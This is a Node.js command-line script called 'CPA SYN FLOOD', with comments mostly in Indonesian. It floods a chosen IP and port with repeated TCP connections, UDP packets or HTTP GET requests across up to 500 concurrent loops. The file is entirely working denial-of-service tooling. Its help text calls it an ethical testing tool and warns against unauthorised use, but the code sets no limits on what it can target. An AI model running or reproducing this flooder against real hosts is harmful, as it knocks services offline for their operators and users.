#!/usr/bin/env node

// ========== DEPENDENCIES ==========
const dgram = require('dgram');
const net = require('net');

// ========== KONFIGURASI ==========
let targetIP = '';
let targetPort = 80;
let threads = 100;
let duration = 60; // default 60 detik
let isRunning = true;
let packetCount = 0;
let startTime = null;

// Warna minimalis
const colors = {
    red: '\x1b[31m',
    green: '\x1b[32m',
    yellow: '\x1b[33m',
    cyan: '\x1b[36m',
    reset: '\x1b[0m'
};

// ========== FUNGSI BANTUAN ==========
function log(message, type = 'info') {
    const timestamp = new Date().toLocaleTimeString();
    const icons = {
        info: '📡',
        success: '✅',
        error: '❌',
        warning: '⚠️',
        attack: '🔥'
    };
    
    let color = colors.cyan;
    if (type === 'success') color = colors.green;
    if (type === 'error') color = colors.red;
    if (type === 'warning') color = colors.yellow;
    if (type === 'attack') color = colors.red;
    
    console.log(`${color}[${timestamp}] ${icons[type]} ${message}${colors.reset}`);
}

function showStats() {
    if (!startTime) return;
    const elapsed = (Date.now() - startTime) / 1000;
    const pps = Math.floor(packetCount / elapsed);
    
    process.stdout.write(`\r${colors.yellow}[STATS] Packets: ${packetCount.toLocaleString()} | PPS: ${pps.toLocaleString()} | Time: ${elapsed.toFixed(1)}/${duration}s${colors.reset}`);
}

// ========== SERANGAN TCP SYN ==========
async function tcpSynFlood(threadId) {
    while (isRunning) {
        try {
            const socket = new net.Socket();
            socket.setTimeout(50);
            
            socket.on('error', () => {
                packetCount++;
                if (packetCount % 100 === 0) showStats();
            });
            
            socket.connect(targetPort, targetIP, () => {
                socket.destroy();
                packetCount++;
                if (packetCount % 100 === 0) showStats();
            });
            
            setTimeout(() => {
                try { socket.destroy(); } catch(e) {}
            }, 50);
            
            await new Promise(resolve => setTimeout(resolve, 1));
            
        } catch(err) {
            packetCount++;
        }
    }
}

// ========== SERANGAN UDP FLOOD ==========
async function udpFlood(threadId) {
    while (isRunning) {
        const client = dgram.createSocket('udp4');
        const payload = Buffer.alloc(1024, 'X');
        
        client.send(payload, targetPort, targetIP, (err) => {
            if (!err) packetCount++;
            client.close();
            if (packetCount % 100 === 0) showStats();
        });
        
        await new Promise(resolve => setTimeout(resolve, 1));
    }
}

// ========== SERANGAN HTTP REQUEST ==========
async function httpFlood(threadId) {
    while (isRunning) {
        const httpClient = net.createConnection(targetPort, targetIP, () => {
            const request = `GET / HTTP/1.1\r\nHost: ${targetIP}\r\nUser-Agent: CPA-Bot/${Math.random()}\r\nAccept: */*\r\nConnection: close\r\n\r\n`;
            httpClient.write(request);
            packetCount++;
            if (packetCount % 100 === 0) showStats();
        });
        
        httpClient.on('error', () => {});
        httpClient.setTimeout(100, () => httpClient.destroy());
        
        await new Promise(resolve => setTimeout(resolve, 10));
    }
}

// ========== CEK IP VALID ==========
function isValidIP(ip) {
    const ipRegex = /^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
    return ipRegex.test(ip);
}

// ========== MENAMPILKAN BANTUAN ==========
function showHelp() {
    console.log(`
${colors.yellow}CPA SYN FLOOD - Ethical Security Testing Tool${colors.reset}

${colors.green}Penggunaan:${colors.reset}
  node cpa_syn_flood.js <IP> <PORT> <THREADS> <DURASI> <METHOD>

${colors.green}Parameter:${colors.reset}
  IP       - Target IP address (wajib)
  PORT     - Target port (default: 80)
  THREADS  - Jumlah threads (default: 100, max: 500)
  DURASI   - Durasi serangan dalam detik (default: 60)
  METHOD   - tcp, udp, atau http (default: tcp)

${colors.green}Contoh:${colors.reset}
  node cpa_syn_flood.js 192.168.1.1 80 100 30 tcp
  node cpa_syn_flood.js 10.0.0.1 53 50 120 udp
  node cpa_syn_flood.js 172.16.0.1 8080 200 45 http

${colors.red}Peringatan:${colors.reset}
  Hanya untuk testing pada sistem milik sendiri!
  Penggunaan tanpa izin adalah tindakan ILEGAL!
    `);
}

// ========== MAIN FUNCTION ==========
async function main() {
    // Parse arguments
    const args = process.argv.slice(2);
    
    if (args.length === 0 || args[0] === '--help' || args[0] === '-h') {
        showHelp();
        process.exit(0);
    }
    
    targetIP = args[0];
    targetPort = parseInt(args[1]) || 80;
    threads = parseInt(args[2]) || 100;
    duration = parseInt(args[3]) || 60;
    const method = (args[4] || 'tcp').toLowerCase();
    
    // Validasi input
    if (!isValidIP(targetIP)) {
        log('IP address tidak valid!', 'error');
        console.log(`Contoh IP yang benar: 192.168.1.100`);
        process.exit(1);
    }
    
    if (targetPort < 1 || targetPort > 65535) {
        log('Port harus antara 1-65535!', 'error');
        process.exit(1);
    }
    
    if (threads < 1 || threads > 500) {
        log('Threads harus antara 1-500!', 'error');
        process.exit(1);
    }
    
    if (duration < 1 || duration > 3600) {
        log('Durasi harus antara 1-3600 detik!', 'error');
        process.exit(1);
    }
    
    // Tampilkan konfigurasi
    console.log(`\n${colors.yellow}[CONFIG]${colors.reset}`);
    console.log(`  Target    : ${targetIP}:${targetPort}`);
    console.log(`  Threads   : ${threads}`);
    console.log(`  Duration  : ${duration} detik`);
    console.log(`  Method    : ${method.toUpperCase()}`);
    console.log('');
    
    log('⚠️  Hanya untuk testing legal!', 'warning');
    log(`Serangan akan dimulai dalam 5 detik...`, 'info');
    log(`Durasi: ${duration} detik`, 'info');
    
    // Countdown
    for (let i = 5; i > 0; i--) {
        process.stdout.write(`\r${colors.yellow}Memulai dalam ${i} detik...${colors.reset}`);
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
    console.log('');
    
    startTime = Date.now();
    
    // Pilih metode serangan
    let attackFunction;
    let methodName = '';
    switch(method) {
        case 'udp':
            attackFunction = udpFlood;
            methodName = 'UDP Flood';
            break;
        case 'http':
            attackFunction = httpFlood;
            methodName = 'HTTP Flood';
            break;
        default:
            attackFunction = tcpSynFlood;
            methodName = 'TCP SYN Flood';
    }
    
    log(`🚀 Memulai ${methodName} ke ${targetIP}:${targetPort}`, 'attack');
    log(`⚡ Mengaktifkan ${threads} threads`, 'info');
    console.log('');
    
    // Jalankan threads
    const promises = [];
    for (let i = 0; i < threads; i++) {
        promises.push(attackFunction(i));
    }
    
    // Monitor stats setiap detik
    const statsInterval = setInterval(() => {
        if (isRunning && startTime) {
            showStats();
        }
    }, 1000);
    
    // Auto stop berdasarkan durasi
    setTimeout(() => {
        if (isRunning) {
            console.log('\n');
            log(`⏰ Durasi ${duration} detik tercapai, menghentikan...`, 'warning');
            stopAttack(statsInterval);
        }
    }, duration * 1000);
    
    // Handle Ctrl+C
    process.on('SIGINT', () => {
        console.log('\n');
        log('🛑 Dihentikan oleh user...', 'warning');
        stopAttack(statsInterval);
    });
    
    // Tunggu semua promise
    await Promise.all(promises);
}

// Fungsi menghentikan serangan
function stopAttack(statsInterval) {
    if (!isRunning) return;
    
    isRunning = false;
    clearInterval(statsInterval);
    
    if (startTime) {
        const elapsed = (Date.now() - startTime) / 1000;
        const avgPPS = Math.floor(packetCount / elapsed);
        
        console.log(`\n${colors.green}[RESULT]${colors.reset}`);
        console.log(`  Total Packets : ${packetCount.toLocaleString()}`);
        console.log(`  Duration      : ${elapsed.toFixed(2)} detik`);
        console.log(`  Average PPS   : ${avgPPS.toLocaleString()}`);
        console.log('');
    }
    
    log('Terima kasih telah menggunakan CPA SYN FLOOD', 'success');
    setTimeout(() => process.exit(0), 1000);
}

// Run
if (require.main === module) {
    main().catch((err) => {
        log(`Error: ${err.message}`, 'error');
        process.exit(1);
    });
}

module.exports = { tcpSynFlood, udpFlood, httpFlood };
